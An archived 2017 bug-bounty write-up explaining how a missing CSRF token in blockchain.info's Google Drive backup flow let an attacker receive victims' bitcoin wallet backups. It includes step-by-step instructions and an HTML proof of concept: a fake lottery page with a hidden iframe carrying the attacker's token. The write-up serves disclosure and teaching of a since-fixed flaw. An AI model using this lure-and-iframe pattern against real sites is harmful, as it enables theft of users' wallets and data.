---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-11-11_stealing-bitcoin-wallet-backups-from-blockchaininfo.md
original_filename: 2017-11-11_stealing-bitcoin-wallet-backups-from-blockchaininfo.md
title: Stealing bitcoin wallet backups from blockchain.info
category: documents
detected_topics:
- oauth
- sso
- command-injection
- otp
- csrf
- clickjacking
tags:
- imported
- documents
- oauth
- sso
- command-injection
- otp
- csrf
- clickjacking
language: en
raw_sha256: 7cfde923efcbcfef685f28b6a82cc626df00a6cf3a3562b74281c5a269d6f380
text_sha256: 3ac798f340b7aac34b29ea03e0574a9c06004bf5666c6b24025bda3529d2684b
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Stealing bitcoin wallet backups from blockchain.info

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-11-11_stealing-bitcoin-wallet-backups-from-blockchaininfo.md
- Source Type: markdown
- Detected Topics: oauth, sso, command-injection, otp, csrf, clickjacking
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `7cfde923efcbcfef685f28b6a82cc626df00a6cf3a3562b74281c5a269d6f380`
- Text SHA256: `3ac798f340b7aac34b29ea03e0574a9c06004bf5666c6b24025bda3529d2684b`


## Content

---
title: "Stealing bitcoin wallet backups from blockchain.info"
page_title: "Shashank's Security Blog: Stealing bitcoin wallet backups from blockchain.info"
url: "http://blog.shashank.co/2017/11/stealing-bitcoin-wallet-backups-from.html"
final_url: "https://blog.shashank.co/2017/11/stealing-bitcoin-wallet-backups-from.html"
authors: ["Shashank (@cyberboyIndia)"]
programs: ["Blockchain.info"]
bugs: ["Logic flaw"]
bounty: "1,600"
publication_date: "2017-11-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6056
---

Oauth, where many bugs arise :)  
  
This was one of my finding for the bug-bounty program of blockchain.info, where I was able to steal anyone's bitcoin wallet backup of their [blockchain.info](https://blockchain.info/) account with negligible user interaction.  
  
  
If you want to know what was this wallet backup feature meant for, you can check here.  
  

> <https://blog.blockchain.com/2014/06/12/tutorial-backup-basics-the-best-ways-to-backup-your-blockchain-wallet/>

  
[P.S This feature has been removed after the bug was reported. Sad! ]  
  
So basically it created a JSON file which was the backup of your account which you could  
Download, Email yourself or store it directly on your Gdrive and Dropbox accounts. The bad part was that if someone else gets your JSON file, he can simply import it at blockchain.info and steal all your bitcoins from your account.  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2_zbaqKRKAwq0OW_Jo1GS3mbbndpnGHKY1yXodrWQ7sSo685w7PaQUcf3XMHtj_-PJ1Px8eWfJWwo7nwwIkHFJ7JdEBK8C9zwPD5NLfT250L0NBQv9JGs3BR2w3_eNi_P7_21-4dqCr8v/s640/Wallet-Backup.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2_zbaqKRKAwq0OW_Jo1GS3mbbndpnGHKY1yXodrWQ7sSo685w7PaQUcf3XMHtj_-PJ1Px8eWfJWwo7nwwIkHFJ7JdEBK8C9zwPD5NLfT250L0NBQv9JGs3BR2w3_eNi_P7_21-4dqCr8v/s1600/Wallet-Backup.png)

  
  
Now the bug was in the implementation of storing it directly to Dropbox and Google Drive.  
  
  
I noticed once you click on Dropbox or Gdrive button, you will be asked to log in with your Google or Dropbox account and once its authorized blockchain will automatically store the backup file in your dropbox or Gdrive using your access token.  
  
  
When I looked more closely at all the requests, I found that if someone makes a Gdrive authentication at the end, the redirect URI was something like this.  
  
  

> https://blockchain.info/wallet/gdrive-update?code={YourGdriveToken}

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIiGqZB39Ein5SPXf_U7Buc-NPfltzk4Nrt18DT7wv6PyqT7mUtCwBSXga8gZdBEzaDLCJrRPygfapncz9tysy_Rc_1wXeKo7WttHA6t5IJGepLySMB_KeK8Knn0AKghfgUsyoGkJKkQ1P/s640/blockchain.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIiGqZB39Ein5SPXf_U7Buc-NPfltzk4Nrt18DT7wv6PyqT7mUtCwBSXga8gZdBEzaDLCJrRPygfapncz9tysy_Rc_1wXeKo7WttHA6t5IJGepLySMB_KeK8Knn0AKghfgUsyoGkJKkQ1P/s1600/blockchain.PNG)

  
  
Noticed something bad? No CSRF token yay!!!!  
  
  
So all I had to do was  
1) authenticate my google account at blockchain.info  
2) Grab my drive token  
3) Send the below link to a victim.  

> https://blockchain.info/wallet/gdrive-update?code={MYGdriveToken}

4) Once the link is clicked, when the victim is logged in into his bitcoin wallet backup will be stored in my Google Drive account  
  
But a normal CSRF is boring. So clickjacking will serve as a catalyst for our attack :)  
  
Although the complete website has clickjacking protection, but this URL was frameable.  
  
  
So final POC  
  

> <html>  
>  <head>  
>  <title>Some fancy bitcoin lottery page</title>  
>  </head>  
>  <body>  
>  <p>You won a lottery just open this page when you are logged in to blockchain.info and amount will be credited to you </p>  
>  <iframe sandbox="allow-scripts allow-forms" src="https://blockchain.info/wallet/gdrive-update?code={Attackers Gdrive Token}" style="width:1%;height:1%"></iframe>  
>  </body>  
>  </html>

  
Once the victim lands on the page, a hiding iframe will be loaded, and the wallet will be stored on the attackers google drive.  
  
Bounty?  
Yes  
  
1600$  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg60gk7ZDkdvZXdidBfikqEm1BGKgCUUbYEF2aiprL8YSS0hhTEO8u_HS8276KUymNjJVuG5Hm-sZgZ891w5YlbfiPU9kW-99HGzu71h43Ol1Aj0kcNKENm9-P1vVN1UfGppjkVAVV45beJ/s640/Screen+Shot+2017-11-08+at+3.01.41+PM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg60gk7ZDkdvZXdidBfikqEm1BGKgCUUbYEF2aiprL8YSS0hhTEO8u_HS8276KUymNjJVuG5Hm-sZgZ891w5YlbfiPU9kW-99HGzu71h43Ol1Aj0kcNKENm9-P1vVN1UfGppjkVAVV45beJ/s1600/Screen+Shot+2017-11-08+at+3.01.41+PM.png)

  
  
They fixed the bug very quickly, and indeed, blockchain.info takes care of their security very seriously. Unfortunately, after reporting this issue, they took down the backup feature forever. Sorry for breaking the backup feature.  
  
Cheers  
Shashank :)
